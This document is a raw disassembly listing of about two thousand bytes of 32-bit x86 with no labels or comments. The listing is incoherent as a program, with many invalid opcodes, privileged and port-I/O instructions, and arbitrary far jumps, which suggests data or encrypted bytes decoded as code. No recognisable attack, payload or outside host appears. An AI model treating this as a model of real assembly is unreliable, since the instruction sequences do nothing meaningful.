  4182ea:	push   ss
  4182eb:	cwde   
  4182ec:	pop    esp
  4182ed:	or     DWORD PTR [edx],edi
  4182ef:	and    al,BYTE PTR [ecx]
  4182f1:	cmp    DWORD PTR [esi],ebx
  4182f3:	ins    DWORD PTR es:[edi],dx
  4182f4:	xchg   dx,ax
  4182f6:	mov    ecx,ecx
  4182f8:	jl     0x418375
  4182fa:	push   0x3d6e6e16
  4182ff:	test   DWORD PTR [ebp-0x47069934],esi
  418305:	loope  0x4182fa
  418307:	mov    bh,0x4e
  418309:	cmp    eax,0x85e34582
  41830e:	gs xchg ebx,eax
  418310:	das    
  418311:	sbb    cl,bh
  418313:	icebp  
  418314:	enter  0x3639,0xf3
  418318:	sub    DWORD PTR [ecx+0x7],ebx
  41831b:	mov    esp,0xb2f8c466
  418320:	mov    esi,0xcce16409
  418325:	hlt    
  418326:	dec    esi
  418327:	dec    BYTE PTR [edi+0x70]
  41832a:	jmp    0x41837c
  41832c:	dec    esp
  41832d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41832e:	fisub  DWORD PTR [ecx+0x39]
  418331:	daa    
  418332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418333:	iret   
  418334:	xchg   DWORD PTR [ecx],edi
  418336:	mov    ebx,0xdc3d6ef3
  41833b:	stc    
  41833c:	sti    
  41833d:	iret   
  41833e:	out    dx,eax
  41833f:	jns    0x41836c
  418341:	fdiv   QWORD PTR [eax+0x537eb71b]
  418347:	cwde   
  418348:	rcr    DWORD PTR [edx-0x48],cl
  41834b:	ss aaa 
  41834d:	xor    BYTE PTR [eax+0x68],bl
  418350:	push   esi
  418351:	jb     0x4183cc
  418353:	xor    edx,esp
  418355:	jmp    0x3d3b:0x43bfd5c4
  41835c:	pop    edx
  41835d:	lods   eax,DWORD PTR ds:[esi]
  41835e:	outs   dx,BYTE PTR ds:[esi]
  41835f:	inc    ecx
  418360:	inc    esp
  418361:	jge    0x4183c9
  418363:	jl     0x41830f
  418365:	mov    al,0xeb
  418367:	sbb    DWORD PTR [eax+0x152cc580],0x1
  41836e:	iret   
  41836f:	mov    eax,0xac89a468
  418374:	xchg   ebp,eax
  418375:	add    BYTE PTR [ebp-0x75],bh
  418378:	mov    ebp,db4
  41837b:	push   eax
  41837c:	sar    BYTE PTR [edx],cl
  41837e:	pop    eax
  41837f:	out    0x2e,eax
  418381:	nop
  418382:	jbe    0x418375
  418384:	jbe    0x418357
  418386:	inc    edx
  418387:	xor    al,0x70
  418389:	pushf  
  41838a:	mov    dl,0x60
  41838c:	fidivr DWORD PTR [ebp+0x4]
  41838f:	in     al,dx
  418390:	loope  0x4183ac
  418392:	clc    
  418393:	adc    ecx,DWORD PTR ds:0x43232b45
  418399:	aas    
  41839a:	aad    0x49
  41839c:	jae    0x41839e
  41839e:	(bad)  
  41839f:	inc    DWORD PTR [edx-0x6e394b97]
  4183a5:	dec    ecx
  4183a6:	and    eax,0xc23f2228
  4183ab:	sti    
  4183ac:	jecxz  0x4183a6
  4183ae:	js     0x4183fe
  4183b0:	les    ebp,FWORD PTR [ecx+eax*8-0x41be6769]
  4183b7:	or     eax,DWORD PTR [edi]
  4183b9:	inc    ebp
  4183ba:	xchg   ecx,eax
  4183bb:	adc    al,0x3c
  4183bd:	mov    ch,0xe
  4183bf:	pop    ss
  4183c0:	dec    eax
  4183c1:	mov    DWORD PTR [ebp+0x11],edi
  4183c4:	mov    al,ds:0xc0b546e8
  4183c9:	mov    ebx,0x8ae682c5
  4183ce:	xchg   edi,eax
  4183cf:	sti    
  4183d0:	or     DWORD PTR [ecx],esp
  4183d2:	aam    0xf
  4183d4:	jmp    0x53b79e9a
  4183d9:	mov    edi,0x965292b7
  4183de:	push   eax
  4183df:	cmp    DWORD PTR [ebp-0x2d],0x4d
  4183e3:	jb     0x418368
  4183e5:	(bad)  
  4183e6:	jmp    0x41840c
  4183e8:	in     al,dx
  4183e9:	jne    0x4183f8
  4183eb:	xchg   ebx,eax
  4183ec:	std    
  4183ed:	mov    ebx,0xa45ddd2
  4183f2:	mov    ds:0x5ca51db2,eax
  4183f7:	cs xchg esp,eax
  4183f9:	cli    
  4183fa:	and    al,ch
  4183fc:	xor    edx,esi
  4183fe:	jns    0x418407
  418400:	xor    ebp,DWORD PTR ds:0xe968f2f
  418406:	enter  0x614f,0x41
  41840a:	cmp    ebp,DWORD PTR [eax+0x3c324144]
  418410:	je     0x41839a
  418412:	mov    ds:0x38f4d7ef,al
  418417:	inc    DWORD PTR [ecx-0x47078841]
  41841d:	mov    ebx,0x8afe0638
  418422:	add    eax,0xd66317fd
  418427:	mov    ds:0x85073ed5,eax
  41842c:	lahf   
  41842d:	adc    eax,0xa3258377
  418432:	or     ecx,ebp
  418434:	out    dx,eax
  418435:	and    dl,0xcc
  418438:	and    edx,DWORD PTR [edx+0x37b15f98]
  41843e:	xlat   BYTE PTR ds:[ebx]
  41843f:	sbb    ebx,ebx
  418441:	fs pop edx
  418443:	push   eax
  418444:	test   DWORD PTR [edx-0x38233e00],esp
  41844a:	cmp    eax,0xd7f23f26
  41844f:	(bad)  
  418450:	rol    BYTE PTR ds:0x1c8b0b89,0xba
  418457:	dec    esp
  418458:	pop    ebx
  418459:	fsubr  st(0),st
  41845b:	aaa    
  41845c:	adc    dl,al
  41845e:	in     eax,dx
  41845f:	sub    eax,0x3a96de44
  418464:	aaa    
  418465:	scas   eax,DWORD PTR es:[edi]
  418466:	pusha  
  418467:	iret   
  418468:	aaa    
  418469:	mov    bl,0xb3
  41846b:	imul   esp,DWORD PTR [ebp+0x34a470c6],0x3e65926d
  418475:	push   cs
  418476:	iret   
  418477:	mov    cs,WORD PTR [ecx]
  418479:	push   0xffffffa2
  41847b:	xchg   esi,eax
  41847c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41847d:	mov    ds:0x24a245dd,al
  418482:	sbb    esp,DWORD PTR [ebp-0x7f]
  418485:	sub    eax,0xe19b2de0
  41848a:	jo     0x4184a9
  41848c:	jl     0x4184e7
  41848e:	test   eax,0x9628c340
  418493:	inc    eax
  418494:	dec    ebp
  418495:	mov    esi,0x7943277d
  41849a:	and    BYTE PTR [ebp+ebp*2-0x708ce018],0xb3
  4184a2:	pop    ebx
  4184a3:	dec    ecx
  4184a4:	bound  ecx,QWORD PTR [ebx+0xd]
  4184a7:	fisttp DWORD PTR [eax]
  4184a9:	pusha  
  4184aa:	mov    edi,0xafd49899
  4184af:	mov    ecx,0xf15ebd3e
  4184b4:	mov    ch,dl
  4184b6:	sbb    dh,0xcb
  4184b9:	adc    ebx,esi
  4184bb:	call   0xdbba3f22
  4184c0:	push   esp
  4184c1:	sub    eax,0x1e5cd354
  4184c6:	(bad)  
  4184c7:	push   0xf2b662e9
  4184cc:	loope  0x41851b
  4184ce:	rcr    DWORD PTR [edx+0x77],1
  4184d1:	scas   eax,DWORD PTR es:[edi]
  4184d2:	(bad)  
  4184d3:	retf   
  4184d4:	(bad)  
  4184d5:	mov    ds:0x3c56a6d8,eax
  4184da:	inc    esi
  4184db:	hlt    
  4184dc:	push   0xffffffd0
  4184de:	hlt    
  4184df:	loope  0x418517
  4184e1:	cmp    BYTE PTR [ebp-0x96bf580],cl
  4184e7:	aad    0xe9
  4184e9:	pop    ss
  4184ea:	xchg   esi,eax
  4184eb:	call   0x3706cb92
  4184f0:	(bad)  
  4184f1:	jmp    0x93a:0xdb543ba7
  4184f8:	inc    esi
  4184f9:	adc    BYTE PTR [ebp-0x16c3455],0x7
  418500:	push   cs
  418501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418502:	arpl   cx,di
  418504:	mov    ecx,0x8bbee50e
  418509:	iret   
  41850a:	mov    dl,0x79
  41850c:	gs and eax,0x57c41494
  418512:	pop    ds
  418513:	mov    BYTE PTR [eax+edx*1-0x717e24b7],al
  41851a:	arpl   WORD PTR [edx+0x31],ax
  41851d:	fstp   DWORD PTR [ebx+0x371ad6b2]
  418523:	xor    cl,BYTE PTR [edx+0x4ed2a0b4]
  418529:	retf   
  41852a:	ja     0x4184ef
  41852c:	div    DWORD PTR [esi]
  41852e:	xor    al,0x67
  418530:	retf   0xa005
  418533:	sbb    BYTE PTR [esi-0x5f],bl
  418536:	pop    esp
  418537:	mov    edx,0xc8b9bee6
  41853c:	or     ch,BYTE PTR [edx]
  41853e:	add    eax,0xc0180648
  418543:	xchg   esi,eax
  418544:	(bad)  
  418545:	add    eax,DWORD PTR [esi]
  418547:	push   edi
  418548:	dec    ecx
  418549:	mov    bh,0xad
  41854b:	push   ecx
  41854c:	popf   
  41854d:	mov    esp,0xf477e501
  418552:	in     al,dx
  418553:	mov    ds:0x96ce809f,al
  418558:	fst    DWORD PTR [esi-0x18b7b5ce]
  41855e:	adc    eax,0x46a13c7a
  418563:	out    0x37,eax
  418565:	mov    esi,0x29da783e
  41856a:	dec    eax
  41856b:	pop    es
  41856c:	pop    ebp
  41856d:	xchg   ebx,eax
  41856e:	xor    eax,0x7e8a0a38
  418573:	dec    ebx
  418574:	add    al,0xa6
  418576:	mov    BYTE PTR [eax+0x71],ah
  418579:	aaa    
  41857a:	stc    
  41857b:	das    
  41857c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41857d:	mov    esp,0x8b168513
  418582:	jno    0x4185ce
  418584:	and    DWORD PTR [edi+0x5e3bd418],edi
  41858a:	cdq    
  41858b:	rcl    ebx,0x2a
  41858e:	arpl   WORD PTR [edx],bx
  418590:	and    ecx,edi
  418592:	clc    
  418593:	mov    esp,0x59ed0074
  418598:	pop    eax
  418599:	cwde   
  41859a:	(bad)  [edx-0x62]
  41859d:	xchg   ebp,eax
  41859e:	mov    ds:0x707c4b7f,al
  4185a3:	or     BYTE PTR [edi+0x68a609ee],bl
  4185a9:	(bad)  
  4185aa:	push   edx
  4185ab:	popa   
  4185ac:	xchg   ebp,eax
  4185ad:	je     0x41855d
  4185af:	mov    edi,0x5b5e11d7
  4185b4:	or     eax,0xcc28af5a
  4185b9:	(bad)  
  4185bb:	dec    esi
  4185bc:	mov    esp,0x4b067aa3
  4185c1:	clc    
  4185c2:	lds    eax,FWORD PTR [edi]
  4185c4:	jmp    0x6c22:0xc58deb2a
  4185cb:	lock push esp
  4185cd:	mov    cl,0x49
  4185cf:	sub    ecx,edi
  4185d1:	stos   DWORD PTR es:[edi],eax
  4185d2:	test   DWORD PTR [edi],0x75ef987
  4185d8:	dec    esi
  4185d9:	pushf  
  4185da:	xchg   ecx,eax
  4185db:	js     0x41858d
  4185dd:	jl     0x41863d
  4185df:	xor    eax,0x3a863e7e
  4185e4:	sbb    BYTE PTR [esi-0x19],dl
  4185e7:	xor    ebp,DWORD PTR ds:0xe891bba3
  4185ed:	iret   
  4185ee:	fs dec edx
  4185f0:	inc    edi
  4185f1:	shl    BYTE PTR [esi],0x33
  4185f4:	mov    DWORD PTR [eax+edx*2-0x1d],eax
  4185f8:	mov    ch,0x1a
  4185fa:	or     al,0xaa
  4185fc:	ss loopne 0x4185c9
  4185ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418600:	jae    0x4185d7
  418602:	int    0xe6
  418604:	gs push ss
  418606:	clc    
  418607:	xor    bh,BYTE PTR [ebp-0x228d032d]
  41860d:	mov    ebp,0x2dd87a7d
  418612:	dec    eax
  418613:	pushf  
  418614:	pop    es
  418615:	lock enter 0x142d,0xdb
  41861a:	mov    ?,WORD PTR [eax-0x7a]
  41861d:	dec    ebx
  41861e:	adc    ch,ah
  418620:	retf   0x354c
  418623:	loope  0x4185a6
  418625:	test   edi,ebp
  418627:	jae    0x4185ed
  418629:	and    eax,0x4ef6d686
  41862e:	clc    
  41862f:	push   ebp
  418630:	push   esp
  418631:	add    ebx,edi
  418633:	push   ebx
  418634:	imul   esp,DWORD PTR [edx+0x6c],0x4fcf20aa
  41863b:	jmp    0x7540:0xa59c10b8
  418642:	bound  edi,QWORD PTR [ecx+0x70]
  418645:	xchg   al,bl
  418647:	ss stos DWORD PTR es:[edi],eax
  418649:	pop    edx
  41864a:	jmp    edx
  41864c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41864d:	add    ecx,DWORD PTR [ebp+0x6ea62600]
  418653:	shl    DWORD PTR [ebp-0x4915621a],1
  418659:	aaa    
  41865a:	mov    dl,0x1a
  41865c:	ds into 
  41865e:	pop    esp
  41865f:	clc    
  418660:	or     ebx,DWORD PTR cs:[eax-0x21]
  418664:	mov    al,ds:0x85d3bfdc
  418669:	call   0xc8a69eee
  41866e:	out    0x84,eax
  418670:	sub    al,0x32
  418672:	dec    esi
  418673:	pop    ebx
  418674:	push   ds
  418675:	xchg   edi,edx
  418677:	dec    ebp
  418678:	outs   dx,BYTE PTR ds:[esi]
  418679:	out    0xc8,eax
  41867b:	mov    eax,ds:0x4426db97
  418680:	push   ebp
  418681:	and    BYTE PTR [eax],al
  418683:	cmp    esp,edi
  418685:	add    al,0xb2
  418687:	retf   
  418688:	mov    eax,0x5d59288
  41868d:	and    BYTE PTR [ebp+0x48],bh
  418690:	test   eax,0x157d9333
  418695:	outs   dx,DWORD PTR ds:[esi]
  418696:	or     DWORD PTR [edi+0x23fa5979],edi
  41869c:	inc    ebx
  41869d:	ret    0x2ce8
  4186a0:	bswap  edx
  4186a2:	jb     0x418684
  4186a4:	sub    DWORD PTR [ecx-0x698cfead],esi
  4186aa:	sar    BYTE PTR [ebp-0x71],0x8e
  4186ae:	call   0x154f:0xf6e89344
  4186b5:	fwait
  4186b6:	test   eax,0x61bac465
  4186bb:	test   esp,eax
  4186bd:	(bad)  
  4186bf:	or     eax,DWORD PTR ss:[edi+0x3096dfbb]
  4186c6:	mov    ecx,0xdb83018d
  4186cb:	xchg   edx,eax
  4186cc:	sbb    ch,cl
  4186ce:	retf   0xa441
  4186d1:	shr    BYTE PTR [eax+0x414d8cfa],cl
  4186d7:	outs   dx,DWORD PTR ds:[esi]
  4186d8:	push   edi
  4186d9:	adc    BYTE PTR [esi],al
  4186db:	mov    ebx,0x555c39a6
  4186e0:	mov    ?,eax
  4186e2:	clc    
  4186e3:	push   ebx
  4186e4:	sbb    BYTE PTR [ebp+eiz*4-0xa],ch
  4186e8:	adc    al,0x44
  4186ea:	fwait
  4186eb:	jg     0x4186d8
  4186ed:	aas    
  4186ee:	ins    BYTE PTR es:[edi],dx
  4186ef:	cmp    eax,0xa7299375
  4186f4:	add    BYTE PTR [ecx],ah
  4186f6:	test   BYTE PTR [ecx-0x52],dh
  4186f9:	xor    edx,DWORD PTR [edi+eiz*1]
  4186fc:	retf   
  4186fd:	out    dx,al
  4186fe:	pop    esp
  4186ff:	jae    0x4186a6
  418701:	mov    ds:0xa25b4e93,eax
  418706:	push   esi
  418707:	iret   
  418708:	push   es
  418709:	lock mov ch,0xe9
  41870c:	add    ebp,DWORD PTR [esi-0x16bd4915]
  418712:	pop    ecx
  418713:	jecxz  0x4186ee
  418715:	xchg   DWORD PTR [edx],edi
  418717:	mov    al,0x48
  418719:	inc    esi
  41871a:	lahf   
  41871b:	in     eax,0xd
  41871d:	cmp    DWORD PTR [edx+0x9],esi
  418720:	das    
  418721:	push   ecx
  418722:	add    eax,0x8d83c7eb
  418727:	ins    DWORD PTR es:[edi],dx
  418728:	jge    0x41877c
  41872a:	ins    DWORD PTR es:[edi],dx
  41872b:	cmp    ecx,DWORD PTR [esp+edi*2-0x4d190a5]
  418732:	pop    ds
  418733:	data16 (bad) 
  418735:	enter  0x8af4,0xf2
  418739:	pusha  
  41873a:	imul   eax,edi,0x9ecf6c10
  418740:	xchg   ebp,eax
  418741:	mov    ss,ecx
  418743:	fs xchg edi,eax
  418745:	adc    eax,0xd95d1da5
  41874a:	sbb    esp,DWORD PTR [ebp+0x2158a305]
  418750:	push   cs
  418751:	in     eax,dx
  418752:	jecxz  0x4187c3
  418754:	add    al,0xd1
  418756:	jnp    0x418732
  418758:	sub    al,0x76
  41875a:	enter  0xbaf0,0x57
  41875e:	cs inc ebp
  418760:	mov    ds:0x41f3f2ac,eax
  418765:	fnstcw WORD PTR [edx+0x3209112d]
  41876b:	xchg   esi,eax
  41876c:	in     eax,0xd4
  41876e:	jns    0x4187a0
  418770:	add    eax,0xb4136a4c
  418775:	add    eax,0x9ce4c93
  41877a:	or     eax,0x8f8d3c9c
  41877f:	test   BYTE PTR ds:0xb0ecff2c,bl
  418785:	stos   BYTE PTR es:[edi],al
  418786:	popa   
  418787:	xor    eax,DWORD PTR [ebx-0x78]
  41878a:	ret    
  41878b:	dec    edi
  41878c:	ins    BYTE PTR es:[edi],dx
  41878d:	dec    ebp
  41878e:	(bad)  
  41878f:	out    0x67,al
  418791:	fdivrp st(2),st
  418793:	lds    esi,FWORD PTR [esi+0x1a43b76b]
  418799:	in     al,dx
  41879a:	jns    0x418760
  41879c:	imul   esi,DWORD PTR [ecx-0x69c104c6],0x612e32b
  4187a6:	xchg   al,dl
  4187a8:	fwait
  4187a9:	ret    
  4187aa:	mov    ch,0xb8
  4187ac:	cmp    eax,0x3a27826a
  4187b1:	mov    esp,0x6edcf91f
  4187b6:	cmp    esp,DWORD PTR [eax-0x554d7ece]
  4187bc:	hlt    
  4187bd:	fcom   DWORD PTR ds:0x995813c9
  4187c3:	mov    edx,0xe6de2b0
  4187c8:	sub    edi,DWORD PTR [eax]
  4187ca:	adc    al,0x26
  4187cc:	adc    eax,0x5dfddaeb
  4187d1:	les    edi,FWORD PTR [ebp+0x70]
  4187d4:	loope  0x418757
  4187d6:	les    edx,FWORD PTR [esi+0x24]
  4187d9:	mov    BYTE PTR [ecx-0xe],bl
  4187dc:	sbb    BYTE PTR [esi],al
  4187de:	cmp    dh,ch
  4187e0:	call   0x47e1:0x2f9a0c6
  4187e7:	mov    dl,0xd
  4187e9:	pop    eax
  4187ea:	pusha  
  4187eb:	jns    0x4187a0
  4187ed:	icebp  
  4187ee:	out    0xde,al
  4187f0:	stos   BYTE PTR es:[edi],al
  4187f1:	jecxz  0x4187a7
  4187f3:	adc    al,BYTE PTR [ecx]
  4187f5:	test   edi,ecx
  4187f7:	in     eax,0x3c
  4187f9:	push   cs
  4187fa:	arpl   WORD PTR ds:0x5ea217b9,bp
  418800:	fdiv   DWORD PTR [esi]
  418802:	xchg   esp,eax
  418803:	mov    ebp,0x22437c5
  418808:	cmc    
  418809:	stos   DWORD PTR es:[edi],eax
  41880a:	or     al,0x41
  41880c:	mov    ebx,0x89f9c214
  418811:	ficom  DWORD PTR [ebx-0x61]
  418814:	pop    eax
  418815:	lods   al,BYTE PTR ds:[esi]
  418816:	mov    esi,0x366c49c9
  41881b:	jmp    0x483b:0x8feb2c89
  418822:	dec    edx
  418823:	cs mov cl,0x7
  418826:	pop    ds
  418827:	cld    
  418828:	sub    eax,0xbf3ad7c6
  41882d:	addr16 out 0x5d,eax
  418830:	aaa    
  418831:	ds (bad) 
  418834:	inc    ecx
  418835:	jbe    0x418855
  418837:	fcomp  DWORD PTR [eax+0x76]
  41883a:	std    
  41883b:	gs xor eax,esi
  41883e:	push   ss
  41883f:	inc    esp
  418840:	jp     0x418819
  418842:	in     al,0x1d
  418844:	ror    BYTE PTR [ecx+eax*4+0x34],0x1f
  418849:	mov    bh,0xde
  41884b:	loope  0x418806
  41884d:	lods   eax,DWORD PTR ds:[esi]
  41884e:	mov    BYTE PTR [ecx],al
  418850:	(bad)  
  418851:	leave  
  418852:	arpl   WORD PTR [ebx+0x72],bx
  418855:	out    dx,eax
  418856:	imul   esp,DWORD PTR [eax+ecx*8-0xd],0xffffffc8
  41885b:	loope  0x418820
  41885d:	mov    WORD PTR [eax+edx*2-0x56],cs
  418861:	(bad)  
  418862:	xchg   esi,eax
  418863:	and    al,0xd
  418865:	nop
  418866:	leave  
  418867:	jge    0x418812
  418869:	or     esp,DWORD PTR [ecx-0x12]
  41886c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41886d:	xor    al,bh
  41886f:	repz push edi
  418871:	pop    eax
  418872:	ds jbe 0x418856
  418875:	add    DWORD PTR [ebx],edi
  418877:	push   esp
  418878:	loope  0x4188d4
  41887a:	lahf   
  41887b:	scas   al,BYTE PTR es:[edi]
  41887c:	shl    DWORD PTR [ecx],1
  41887e:	in     eax,0xe
  418880:	sar    BYTE PTR [esi+esi*8-0x7e385340],cl
  418887:	xor    BYTE PTR [esi+0x47b071eb],cl
  41888d:	fsubr  DWORD PTR [ecx-0x17]
  418890:	or     ebx,DWORD PTR [edx]
  418892:	in     eax,0x90
  418894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418895:	inc    esp
  418896:	mov    ebx,0xa4c4beaa
  41889b:	(bad)
  41889e:	and    edx,ebx
  4188a0:	mov    ebx,0xe176b77b
  4188a5:	push   ecx
  4188a6:	or     dh,bh
  4188a8:	pusha  
  4188a9:	or     eax,esp
  4188ab:	cli    
  4188ac:	cmp    DWORD PTR [ecx],0xffffffd2
  4188af:	mov    ds:0x48ab51d7,al
  4188b4:	mov    BYTE PTR [esi+0x102ece61],ch
  4188ba:	call   0x96c4ac5c
  4188bf:	jbe    0x4188bc
  4188c1:	inc    edx
  4188c2:	repz cmp eax,0xe70ff9a5
  4188c8:	jnp    0x4188c5
  4188ca:	hlt    
  4188cb:	dec    edx
  4188cc:	xchg   edi,eax
  4188cd:	mov    ecx,DWORD PTR [eax+0x6f]
  4188d0:	scas   al,BYTE PTR es:[edi]
  4188d1:	mov    WORD PTR [edx-0x27200385],cs
  4188d7:	cs popa 
  4188d9:	jmp    0x418868
  4188db:	cmp    BYTE PTR [eax+0x55ca0b20],dh
  4188e1:	jge    0x4188a2
  4188e3:	pop    ss
  4188e4:	out    0xd9,eax
  4188e6:	add    DWORD PTR [eax-0x14],ebp
  4188e9:	shl    BYTE PTR [edi+0x17],0x8d
  4188ed:	jmp    0x418956
  4188ef:	test   esi,esi
  4188f1:	mov    ch,0x97
  4188f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188f4:	scas   eax,DWORD PTR es:[edi]
  4188f5:	mov    ebx,ebx
  4188f7:	jecxz  0x418962
  4188f9:	adc    al,dl
  4188fb:	mov    ecx,0xc2cbfe0
  418900:	push   ss
  418901:	inc    esp
  418902:	push   ds
  418903:	mov    eax,ds:0x4dc93dbb
  418908:	jl     0x4188a5
  41890a:	ret    
  41890b:	das    
  41890c:	fcomip st,st(1)
  41890e:	ror    DWORD PTR ds:0x39fd254c,0xf6
  418915:	fxch   st(7)
  418917:	inc    ebx
  418918:	fwait
  418919:	and    cl,BYTE PTR [ebx]
  41891b:	clc    
  41891c:	in     al,0xa
  41891e:	and    eax,DWORD PTR [ebp-0x78c12d0f]
  418924:	hlt    
  418925:	sbb    DWORD PTR [ecx+ebp*4-0x74],edx
  418929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41892a:	push   esi
  41892b:	sub    DWORD PTR [ecx+0x65],ebx
  41892e:	gs jb  0x4188ee
  418931:	cli    
  418932:	stos   BYTE PTR es:[edi],al
  418933:	(bad)  [ebx-0x24]
  418936:	xchg   ebx,eax
  418937:	test   eax,0x5088d62a
  41893c:	aas    
  41893d:	leave  
  41893e:	imul   esp,DWORD PTR [edx+0x42080cb9],0x15
  418945:	aaa    
  418946:	xchg   DWORD PTR [ebx],ecx
  418948:	shl    DWORD PTR [eax-0x3de6c7e7],1
  41894e:	mov    esp,0xcf65bc6e
  418953:	and    dh,BYTE PTR [esi+0x72]
  418956:	mov    ch,0x9c
  418958:	mov    bh,0xb5
  41895a:	and    eax,esp
  41895c:	add    DWORD PTR [eax-0x24f3c526],ebp
  418962:	fldln2 
  418964:	retf   0xf4e7
  418967:	xor    al,0xdf
  418969:	dec    ebp
  41896a:	mov    edx,0x69e932b3
  41896f:	rcr    BYTE PTR [edx+0x32],cl
  418972:	mov    ah,0x77
  418974:	aad    0x6
  418976:	cmc    
  418977:	add    ecx,edi
  418979:	mov    BYTE PTR [ebx+esi*8-0x1c],0x4a
  41897e:	leave  
  41897f:	rcl    DWORD PTR [eax+0x7f3b886e],0x67
  418986:	adc    al,0xea
  418988:	cmp    BYTE PTR [edx-0x12412e6d],dl
  41898e:	jne    0x41891e
  418990:	sbb    bl,BYTE PTR [esi-0x2fce4ce7]
  418996:	and    DWORD PTR [ebp+eiz*1+0x94c8177],ebx
  41899d:	clc    
  41899e:	leave  
  41899f:	ins    BYTE PTR es:[edi],dx
  4189a0:	sbb    esi,DWORD PTR [edx]
  4189a2:	sub    esp,DWORD PTR cs:[edx+0x33]
  4189a6:	pop    ecx
  4189a7:	addr16 jg 0x4189ee
  4189aa:	ss dec ecx
  4189ac:	jecxz  0x418953
  4189ae:	mov    esp,0x4d0ee285
  4189b3:	xlat   BYTE PTR ds:[ebx]
  4189b4:	inc    edi
  4189b5:	ret    0xd9a
  4189b8:	adc    DWORD PTR [esp+ecx*1-0x64],esp
  4189bc:	dec    edx
  4189bd:	aam    0x9e
  4189bf:	outs   dx,DWORD PTR ds:[esi]
  4189c0:	xor    eax,0x619e5933
  4189c5:	aaa    
  4189c6:	pusha  
  4189c7:	dec    ebx
  4189c8:	and    edx,DWORD PTR [esi+ebx*2-0x2650391f]
  4189cf:	(bad)  
  4189d0:	out    0x2c,eax
  4189d2:	add    DWORD PTR [edx-0xdd59f7c],ebx
  4189d8:	push   0x42849bad
  4189dd:	inc    eax
  4189de:	cmp    BYTE PTR [esi],dh
  4189e0:	or     esi,0xffffff81
  4189e3:	or     dh,BYTE PTR [esi-0x2d]
  4189e6:	cmp    eax,edi
  4189e8:	loop   0x4189f6
  4189ea:	adc    dl,BYTE PTR [edi-0x7a1f3b0]
  4189f0:	push   cs
  4189f1:	cli    
  4189f2:	cmp    bh,BYTE PTR [esi-0x4b640840]
  4189f8:	ins    BYTE PTR es:[edi],dx
  4189f9:	aaa    
  4189fa:	inc    ebp
  4189fb:	dec    esp
  4189fc:	hlt    
  4189fd:	retf   0x804d
  418a00:	cmp    edi,DWORD PTR [eax]
  418a02:	paddw  mm1,QWORD PTR [ebp-0x45]
  418a06:	mov    bl,ah
  418a08:	xchg   ebx,eax
  418a09:	and    eax,0xe
  418a0c:	mov    ch,0x22
  418a0e:	ins    BYTE PTR es:[edi],dx
  418a0f:	and    dh,BYTE PTR [esi-0x2c588f1b]
  418a15:	sub    al,0x9e
  418a17:	adc    al,0x15
  418a19:	gs mov esi,0x685cda03
  418a1f:	mov    edx,0x57ca8837
  418a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a25:	inc    ecx
  418a26:	xchg   DWORD PTR [ebp-0x17],edx
  418a29:	nop
  418a2a:	adc    BYTE PTR [edi-0x38],0xf0
  418a2e:	mov    ecx,0xb942be26
  418a33:	arpl   WORD PTR [edi+0x9],ax
  418a36:	fstp   QWORD PTR [ebp+0x15]
  418a39:	xchg   edx,eax
  418a3a:	xchg   edx,eax
  418a3b:	jne    0x418aa0
  418a3d:	fsubr  QWORD PTR [ebx]
  418a3f:	test   eax,0x2e80db5
  418a44:	push   eax
  418a45:	lods   eax,DWORD PTR ds:[esi]
  418a46:	mov    esp,0x61c0f6fb
  418a4b:	pop    edx
  418a4c:	xchg   ebx,eax
  418a4d:	xchg   DWORD PTR [esi],edi
  418a4f:	jmp    0x5eb2c646
  418a54:	pop    edx
  418a55:	(bad)  
  418a57:	stos   BYTE PTR es:[edi],al
  418a58:	imul   esp,esp,0xffffff99
  418a5b:	cmp    ebp,ebx
  418a5d:	ret    0xb745
  418a60:	rol    esp,1
  418a62:	add    al,0x38
  418a64:	push   es
  418a65:	loope  0x418a49
  418a67:	in     eax,0x18
  418a69:	fsubp  st(2),st
  418a6b:	jmp    0x6cd8:0xbd83e1cf
  418a72:	push   es
  418a73:	push   ecx
  418a74:	and    esi,esi
  418a76:	push   ds
  418a77:	dec    esi
  418a78:	addr16 xchg edx,eax
  418a7a:	jl     0x418a88
  418a7c:	mov    al,0x83
  418a7e:	sub    bh,0x3f
  418a81:	mov    cl,0x3a
  418a83:	pop    ss
  418a84:	add    al,0x49
  418a86:	or     esi,DWORD PTR [ecx+ebx*1]
  418a89:	jne    0x418b08
  418a8b:	aas    
  418a8c:	les    edx,FWORD PTR [ebp+0x2600073c]
  418a92:	mov    cl,0x59
  418a94:	jno    0x418aa7
  418a96:	sub    eax,0x9598333e
  418a9b:	dec    edx
  418a9c:	imul   ebx,DWORD PTR [ebp-0x66],0x6d
  418aa0:	(bad)  
  418aa1:	mov    DWORD PTR [eax+0x7a0b34b1],ecx
  418aa7:	xchg   ecx,eax
  418aa8:	mov    esp,0x7e391590
  418aad:	add    BYTE PTR [esi-0x70],bh
  418ab0:	push   es
  418ab1:	jge    0x418a73
  418ab3:	add    BYTE PTR [edi+0x77],bl
  418ab6:	sub    DWORD PTR [eax+0x2f88ae89],eax
  418abc:	addr16 fwait
  418abe:	int3   
  418abf:	std    
  418ac0:	cwde   
  418ac1:	add    ah,BYTE PTR [edi+0x59db5242]
  418ac7:	outs   dx,DWORD PTR ds:[esi]
  418ac8:	push   ebx
  418ac9:	xchg   edx,eax
  418aca:	rep stos BYTE PTR es:[edi],al
  418acc:	jmp    0x573:0xf9f18f1b
  418ad3:	or     al,0x42
  418ad5:	dec    eax
  418ad6:	add    DWORD PTR [ecx],0x889272fb
  418adc:	sub    ch,BYTE PTR [esi+0x2857330b]
  418ae2:	in     eax,0xc4
  418ae4:	fwait
  418ae5:	arpl   WORD PTR [ebx],bp
  418ae7:	xor    eax,0x2a30e156
  418aec:	add    DWORD PTR [ebx+0x43],edx
  418aef:	test   DWORD PTR [ebp-0xe],esp
  418af2:	mov    ebx,0xa0453490
  418af7:	mov    ecx,DWORD PTR ds:0x54857efd
  418afd:	dec    esi
